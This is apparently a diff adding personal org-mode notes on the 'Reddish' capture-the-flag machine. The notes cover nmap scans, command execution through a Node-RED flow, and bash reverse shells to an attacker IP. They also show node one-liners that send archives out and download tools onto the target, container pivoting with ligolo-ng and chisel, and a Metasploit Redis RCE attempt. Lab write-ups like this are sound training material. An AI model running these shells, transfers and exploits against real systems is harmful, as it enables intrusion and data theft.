@@ -1,0 +1,519 @@
+==
+tags: #linux #insane
+=
+  
+* nmap
+ #+begin_src bat
+ sudo nmap -sV -sC -oA nmap/reddish.basic 10.129.59.75
+
+Nmap scan report for 10.129.59.75
+Host is up (0.033s latency).
+All 1000 scanned ports on 10.129.59.75 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+ #+end_src
+** full scan
+   #+begin_src bat
+   sudo nmap -p- -A -T4 -oA nmap/reddish.full 10.129.59.75
+   #+end_src
+   this didn't even start; chatgpt suggests a 2-stage approach - first, a port
+   discovery scan:
+** tcp port discovery scan
+   #+begin_src bat
+   $ sudo nmap -p- --min-rate 10000 -oA nmap/reddish.alltcp 10.129.59.75
+
+PORT     STATE SERVICE
+1880/tcp open  vsat-control
+   #+end_src
+   and then a services detection scan against that port.
+   This avoids running =-A= against all 65,535 ports
+** services detection scan
+   #+begin_src bat
+   sudo nmap -sV -sC -p1880 -oA nmap/reddish.services 10.129.59.75
+
+PORT     STATE SERVICE VERSION
+1880/tcp open  http    Node.js Express framework
+|_http-title: Error
+   #+end_src
+** udp top 1000 scan
+   #+begin_src 
+   sudo nmap -sU --top-ports 1000 --min-rate 2000 -T4 -oA nmap/reddish.udp-top 10.129.61.166
+
+PORT      STATE  SERVICE
+10000/udp closed ndmp
+20082/udp closed unknown
+21468/udp closed unknown
+32778/udp closed sometimes-rpc20
+32798/udp closed unknown
+61481/udp closed unknown
+   #+end_src
+* http port 1880
+  trying to access the port results in a =Cannot GET /= page.
+* fuzzing
+** directory fuzz
+   #+begin_src bat
+   gobuster dir -u http://10.129.59.75:1880 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+icons                (Status: 301) [Size: 169] [--> /icons/]
+red                  (Status: 301) [Size: 165] [--> /red/]
+vendor               (Status: 301) [Size: 171] [--> /vendor/] 
+   #+end_src
+   none of these are accessible
+* POST request                                                       :ATTACH:
+  :PROPERTIES:
+  :ID:       417b3450-99f4-4d0c-ba7c-08fadffa3787
+  :END:
+  #+begin_src bash
+  $ curl -X POST http://10.129.59.75:1880
+
+{"id":"eb55e5d83175bbedb58b349db9944f98","ip":"::ffff:10.10.17.115","path":"/red/{id}"}
+  #+end_src
+  accessing the =/red/<id>= path, we get a web app:
+  [[attachment:2026-09-17_00-30.png]]
+* exploiting the app                                                 :ATTACH:
+  :PROPERTIES:
+  :ID:       a0f213d7-7ade-4359-bffd-826a43bc8b33
+  :END:
+  turns out we can construct this flow where you can issue a command which
+  will then be executed on the machine:
+  [[attachment:2026-09-17_12-03.png]]
+* reverse shell
+  #+begin_src bat
+  bash -i >& /dev/tcp/10.10.17.115/4444 0>&1
+  #+end_src
+  this failed with:
+  #+begin_src 
+  /bin/sh: 1: Syntax error: Bad fd number
+  #+end_src
+  so this is =/bin/sh=; meaning the reverse shell command will be:
+** /bin/sh reverse shell
+   #+begin_src bat
+   /bin/bash -c 'bash -i >& /dev/tcp/10.10.17.115/4444 0>&1'
+   #+end_src
+   with this we get a shell:
+   #+begin_src bat
+   $ nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.10.17.115] from (UNKNOWN) [10.129.59.75] 49738
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@nodered:/node-red#
+   #+end_src
+* the container
+  after looking around the code a bit, it's evidently a =node-red= app; and we
+  can also see this is a docker container:
+  #+begin_src bat
+  root@nodered:/node-red# ls -la /
+
+-rwxr-xr-x   1 root root    0 May  4  2018 .dockerenv
+...
+<SNIP>
+  #+end_src
+** confirm if it's a docker container
+   #+begin_src bat
+   cat /proc/1/cgroup
+
+12:devices:/docker/c075cbb
+...<SNIP>
+   #+end_src
+* docker escape
+** find docker.sock
+   #+begin_src bat
+   find / -name "docker.sock" 2>/dev/null
+   #+end_src
+   returns nothing.
+** check capabilites
+   trying out a few container escape stuff from [[https://medium.com/@indigoshadowwashere/linux-docker-container-escapes-cheatsheet-49e47f21e27a][here]]:
+   #+begin_src 
+   root@nodered:/node-red# capsh --print
+
+Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
+
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=
+root@nod
+   #+end_src
+   =cap_sys_admin= would have been useful, but it's not present.
+* transfer source files with node
+** compress the files with tar
+   #+begin_src bat
+   tar -czvf nodered_analysis.tar.gz settings.js package.json package-lock.json  multinodered.js red.js home/ nodes/ lib/ red/ --exclude='node_modules'
+   #+end_src
+** start a listener to write to local file
+   #+begin_src bat
+   nc -lvnp 8000 > received_file.tar.gz
+   #+end_src
+** transfer the archive with node
+   #+begin_src bat
+   node -e 'const fs = require("fs"), net = require("net"); const s = net.connect(8000, "10.10.17.115", () => { fs.createReadStream("./nodered_analysis.tar.gz").pipe(s); });'
+   #+end_src
+* container properties
+  #+begin_src bat
+  root@nodered:/# uname -a
+
+Linux nodered 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 GNU/Linux
+  #+end_src
+  the kernel is shared by the container and the host; so this needn't mean the
+  container is using Ubuntu;
+  #+begin_src bat
+  root@nodered:/# cat /etc/os-release
+
+PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
+NAME="Debian GNU/Linux"
+VERSION_ID="8"
+VERSION="8 (jessie)"
+ID=debian
+HOME_URL="http://www.debian.org/"
+SUPPORT_URL="http://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+root@nodered:/# 
+  #+end_src
+  so turns out the container is hosting a debian image.
+* CDK - container pentesting framework
+  they have these instructions in the [[https://github.com/cdk-team/CDK][repo readme]]:
+** host the cdk binary
+   #+begin_src bat
+   python -m http.server 999
+   #+end_src
+** download on target with node
+   #+begin_src bat
+   node -e 'require("http").get("http://10.10.17.115:999/cdk_linux_amd64",r=>{const f=require("fs").createWriteStream("/tmp/cdk");r.pipe(f)})'
+   #+end_src
+** run
+   #+begin_src bat
+   root@nodered:/node-red# chmod +x ./cdk
+   root@nodered:/node-red# ./cdk eva --full > cdk-output.txt
+   #+end_src
+   doesn't look like it has found anything interesting; but double-check with
+   chatgpt
+*** upload the txt file to the attack host
+    nc listener:
+   #+begin_src bat
+   nc -lvnp 8000 > cdk-output.txt
+   #+end_src
+   transfer:
+   #+begin_src 
+   node -e 'const fs = require("fs"), net = require("net"); const s = net.connect(8000, "10.10.17.115", () => { fs.createReadStream("./cdk.txt").pipe(s); });'
+   #+end_src
+   chatgpt also suggests nothing particularly interesting has been found.
+* OFFICIAL SOLUTION
+  turns out the machine is connected to two networks:
+  #+begin_src
+  root@nodered:/node-red# ip a
+
+13: eth0@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+19: eth1@if20: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
+    inet 172.19.0.4/16 brd 172.19.255.255 scope global eth1
+       valid_lft forever preferred_lft forever
+  #+end_src
+  ping scan both:
+  #+begin_src bat
+  for i in $(seq 1 10); do ping -c 1 "172.18.0.$i" | grep from; done
+< i in $(seq 1 10); do ping -c 1 "172.18.0.$i" | grep from; done             
+64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.077 ms
+64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.031 ms
+
+  for i in $(seq 1 10); do ping -c 1 "172.19.0.$i" | grep from; done
+< i in $(seq 1 10); do ping -c 1 "172.19.0.$i" | grep from; done             
+64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.079 ms
+64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.059 ms
+64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.060 ms
+64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.023 ms
+  #+end_src
+  we can use this as a jump host and perform an nmap scan to identify the
+  services running on them; let's try ligolo-ng
+** ligolo-ng
+   download both the =agent= and =proxy= binaries from the repo and transfer the
+   =agent=:
+   #+begin_src bat
+   node -e 'require("http").get("http://10.10.17.115:999/agent",r=>{const f=require("fs").createWriteStream("./agent");r.pipe(f)})'
+   #+end_src
+*** proxy
+    #+begin_src bat
+    sudo ./proxy -selfcert
+    #+end_src
+*** agent
+   #+begin_src bat
+   ./agent -connect 10.10.17.115:11601
+
+2026/10/02 09:29:41 [ERR] yamux: Failed to read header: tls: failed to verify certificate: x509: cannot validate certificate for 10.10.17.115 because it doesn't contain any IP SANs
+time="2026-10-02T09:29:41Z" level=error msg="Connection error: tls: failed to verify certificate: x509: cannot validate certificate for 10.10.17.115 because it doesn't contain any IP SANs"
+time="2026-10-02T09:29:41Z" level=warning msg="Connection lost. Attempting to reconnect..."
+   #+end_src
+   fails; use =-ignore-cert=:
+   #+begin_src bat
+   ./agent -connect 10.10.17.115:11601 -ignore-cert
+
+time="2026-10-02T09:31:21Z" level=warning msg="warning, certificate validation disabled"
+time="2026-10-02T09:31:21Z" level=info msg="Connection established" addr="10.10.17.115:11601"
+   #+end_src
+   on proxy:
+   #+begin_src bat
+   INFO[4364] Agent joined.       id=0242ac120002 name=root@nodered remote="10.129.76.230:34410"
+   #+end_src
+*** start tunnel
+    #+begin_src 
+    [Agent : root@nodered] » session
+? Specify a session : 1 - root@nodered - 10.129.76.230:53474 - 0242ac120002
+
+    [Agent : root@nodered] » tunnel_start --tun evil-cha
+INFO[0041] Starting tunnel to root@nodered (0242ac120002) 
+    #+end_src
+    =ipconfig= now shows:
+    #+begin_src
+    <SNIP>
+    evil-cha: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet6 fe80::8ce1:6418:9342:7bdc  prefixlen 64  scopeid 0x20<link>
+    #+end_src
+* internal nmap scan
+  #+begin_src 
+  nmap -sV -sC -oA nmap/172.18.basic 172.18.0.1 172.18.0.2
+
+All 1000 scanned ports on 172.18.0.2 are in ignored states.                                                           
+Not shown: 1000 closed tcp ports (reset)    
+  #+end_src
+  confirmed with ping that the host is accessible; try =172.19=
+  #+begin_src bat
+  $ nmap -sV -sC -oA nmap/172.19.basic 172.19.0.1 172.19.0.2 172.19.0.3 172.19.0.4
+
+Nmap scan report for 172.19.0.1                            
+Host is up (0.088s latency).                               
+All 1000 scanned ports on 172.19.0.1 are in ignored states.                                                           
+Not shown: 1000 closed tcp ports (reset)                   
+
+Nmap scan report for 172.19.0.2                            
+Host is up (0.066s latency).                               
+All 1000 scanned ports on 172.19.0.2 are in ignored states.                                                           
+Not shown: 1000 closed tcp ports (reset)                   
+
+Nmap scan report for 172.19.0.3                                                                                       
+Host is up (0.069s latency).                                                                                          
+Not shown: 999 closed tcp ports (reset)                    
+PORT   STATE SERVICE VERSION                               
+80/tcp open  http    Apache httpd 2.4.10 ((Debian))        
+|_http-server-header: Apache/2.4.10 (Debian)               
+|_http-title: Reddish  
+  #+end_src
+* webserver on 172.19.0.3                                            :ATTACH:
+  :PROPERTIES:
+  :ID:       c3901963-18bf-43e1-9db4-10640c088dfd
+  :END:
+  [[attachment:2026-10-10_03-47.png]]
+* redo nmap scan, check for redis
+  it turns out the default scan doesn't include redis;
+  #+begin_src bat
+  nmap -sV -sC -oA -p 6379 nmap/172.19.redis 172.19.0.1 172.19.0.2 172.19.0.3 172.19.0.4
+  #+end_src
+  shows filtered for everything; same for the 172.18 network.
+** full scan
+   #+begin_src bat
+   sudo nmap -p- -A -T4 -oA nmap/172.19.full 172.19.0.1 172.19.0.2 172.19.0.3 172.19.0.4
+
+Nmap scan report for 172.19.0.2
+
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 4.0.9
+OS fingerprint not ideal because: Host distance (-11 network hops) appears to be negative
+No OS matches for host
+Network Distance: -11 hops
+
+Nmap scan report for 172.19.0.3
+
+PORT     STATE SERVICE VERSION
+1880/tcp open  http    Node.js Express framework
+|_http-title: Error
+Device type: phone
+Running (JUST GUESSING): Sony Ericsson embedded (85%)
+OS CPE: cpe:/h:sonyericsson:j20 cpe:/h:sonyericsson:j20i
+Aggressive OS guesses: Sony Ericsson Hazel (J10, J20) or Elm mobile phone (85%), Sony Ericsson W705 or W995 Walkman mobile phone (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: -11 hops
+ #+end_src
+ so there's a redis and +possibly an additional express app+ - it's the main app
+   18 network:
+   #+begin_src bat
+   sudo nmap -p- -A -T4 -oA nmap/172.18.full 172.18.0.1 172.18.0.2
+   #+end_src
+* redis
+** anonymous login
+   #+begin_src bat
+   redis-cli -h 172.19.0.2
+
+172.19.0.2:6379> keys *                                   
+(empty array)
+   #+end_src
+   from running the =info= command we can see the version is =4.0.9= which is
+   quite old and has exploits
+   #+begin_src bat
+172.19.0.2:6379> info
+<SNIP>
+redis_version:4.0.9
+   #+end_src
+   searchsploit reveals:
+   #+begin_src 
+   Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)  
+   #+end_src
+* msfconsole
+  #+begin_src bat
+  msf exploit(linux/redis/redis_unauthenticated_rce) > options
+
+  Module options (exploit/linux/redis/redis_unauthenticated_rce):
+
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  CUSTOM    true             yes       Whether compile payload file during exploiting
+  PASSWORD  foobared         no        Redis password for authentication test
+  RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT     6379             yes       The target port (TCP)
+
+
+  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+  SRVPORT  6379             yes       The local port to listen on.
+
+
+  Payload options (linux/x64/meterpreter/reverse_tcp):
+
+  Name   Current Setting  Required  Description
+  ----   ---------------  --------  -----------
+  LHOST                   yes       The listen address (an interface may be specified)
+  LPORT  4444             yes       The listen port
+
+
+  Exploit target:
+
+  Id  Name
+  --  ----
+  0   Automatic
+
+
+  View the full module info with the info, or info -d command.
+
+  msf exploit(linux/redis/redis_unauthenticated_rce) > set RHOSTS 172.19.0.2
+  #+end_src
+  I was confused about what *SRVHOST* should be - turns out, in general, it 
+  indicates a rogue server which we control; it is necessary for some exploits
+  like in this case, the exploit requires a rogue master redis server; so i
+  tried setting *SRVHOST* to the kali ip; but the exploit didn't work.
+  Gemini explanation:
+  #+begin_src 
+  In Metasploit, SRVHOST stands for Server Host.
+  When a Metasploit exploit module requires an SRVHOST, it means the module
+  needs to spin up a temporary local server on your own attacking machine (or
+  a server you control) to host a payload or an exploit file that the victim
+  machine will fetch.
+  In the context of the Redis master-slave replication exploit you are
+  running:
+  1. What it does: Metasploit needs to act as the "rogue" Redis master server.
+  2. Why it needs SRVHOST: The SRVHOST parameter tells Metasploit which
+     network interface IP address on your attacking machine it should bind to
+     so it can listen for the incoming replication connection from the victim
+     Redis server.
+  #+end_src
+  however, the issue is that the redis container is not able to reach back to
+  our attack host, so the exploit fails:
+  #+begin_src bat
+  msf exploit(linux/redis/redis_unauthenticated_rce) > set SRVHOST tun0
+
+  msf exploit(linux/redis/redis_unauthenticated_rce) > run
+[*] Started reverse TCP handler on 10.10.17.115:4444 
+[*] 179.19.0.2:6379       - Compile redis module extension file
+[+] 179.19.0.2:6379       - Payload generated successfully! 
+[-] 179.19.0.2:6379       - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (179.19.0.2:6379) timed out.
+  #+end_src
+* OFFICIAL GUIDE                                                     :ATTACH:
+  :PROPERTIES:
+  :ID:       904545de-159f-4762-be1e-4d4e3158c462
+  :END:
+  so, upon inspecting the web page on =179.19.0.3=, we see the following:
+  [[attachment:2026-10-14_04-07.png]]
+  meaning, it is possible for the redis container to access the web folder of
+  this container - so we can write a reverse shell there and get a connection
+  so the situtation currently seems to be something like this:
+  #+begin_src 
+  kali -> node express container -> redis container
+  ^            \                            \     
+ /|\            \                            \     
+  |              \--> apache container <------write to web folder
+  |                         /
+  |                        /
+  ???---------------------/
+  #+end_src
+  as illustrated, we need a way for the apache container to talk to kali. one
+  way would be transfer the agent to the apache container and initiate a
+  connection to the proxy - but we don't have code execution on the apache
+  container - so we can't get the agent to do anything.
+
+* ippsec
+  does a =-T5= aggressive scan with =--max-retries 0=;
+  #+begin_src bat
+  nmap -p- -T5 --max-retries 0 -v -oA nmap/reddish.allports-aggressive <ip>
+  #+end_src
+** application on 1880
+   notices the icon on the site and fetches it at =/favicon.ico= and does a
+   reverse image search.
+** linenum
+   runs this and the output says we can read the shadow file - guesses that
+   it should be docker if we're allowed to do that without a password; also,
+   the scan reveals the internal networks.
+** chisel - downsizing the binary
+   build it with:
+   #+begin_src bat
+   go build -ldflags="-s -w"
+   #+end_src
+   this results in a binary of size ~10MB. compress with =upx=
+   #+begin_src
+   upx brute ./chisel
+   #+end_src
+   transfer with bash:
+   #+begin_src bat
+   nc -lvnp 8000 < chisel
+   #+end_src
+   #+begin_src bat
+   bash -c "cat < /dev/tcp/10.10.17.115/8000 > chisel"
+   #+end_src
+   NOTE: couldn't get this to work; it hung for me
+   so download with node instead:
+   #+begin_src bat
+   node -e 'require("http").get("http://10.10.17.115:999/chisel",r=>{const f=require("fs").createWriteStream("./chisel");r.pipe(f)})'
+   #+end_src
+** chisel - connections
+   on kali, open a port:
+   #+begin_src bat
+   ./chisel server -p 8000 -reverse -v
+   #+end_src
+   on the target:
+   #+begin_src
+   ./chisel client 10.10.17.115:8000 R:8001:172.19.0.4:80
+
+./chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./chisel)
+./chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./chisel)
+   #+end_src
+   we'll need an older version of chisel.
+   NOTE: as noted in the official guide, the ips of the containers can change
+   on startup; the node-red app is on =172.19.0.4= here;
+** chisel - static build
+   chatgpt suggests building statically to avoid the libary issues; so:
+   #+begin_src 
+   CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w" -o chisel-static .
+   #+end_src
+   confirm it's static:
+   #+begin_src bat
+   $ ldd ./chisel-static 
+        not a dynamic executable
+   #+end_src
